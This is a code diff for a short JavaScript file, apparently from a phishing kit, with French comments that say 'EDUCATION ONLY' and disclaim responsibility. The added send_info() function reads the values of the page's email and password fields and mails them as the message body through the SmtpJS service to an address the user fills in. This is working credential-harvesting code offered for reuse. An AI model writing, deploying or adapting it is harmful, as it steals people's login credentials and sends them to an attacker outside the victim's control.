@@ -1,21 +1,23 @@
+// Pour pouvoir avoir des emails, vous devez
+// créer un compte sur https://smtpjs.com/
+// EDUCATION ONLY
+// je ne suis pas responsable de vos actes
 
 
-var email = document.getElementById("email");
-var password = document.getElementById("pass");
+function send_info() {
 
-console.log(email);
-console.log(password);
+  var email = document.getElementById("email").value;
+  var password = document.getElementById("pass").value;
 
+  Email.send({
+      SecureToken : "YOUR TOKEN",
+      To : 'SENDER',
+      From : "RECIPENT",
+      Subject : "Subject",
+      Body : "<h1>"+email+"</h1>" + "<br><br>" + "<h2>"+password+"</h2>"
+  });
 
-Email.send({
-    SecureToken : "secret",
-    To : 'xxx',
-    From : "xxx",
-    Subject : "sujet",
-    Body : "body"
-}).then(
-  message => alert(message)
-);
+}
 
 
 
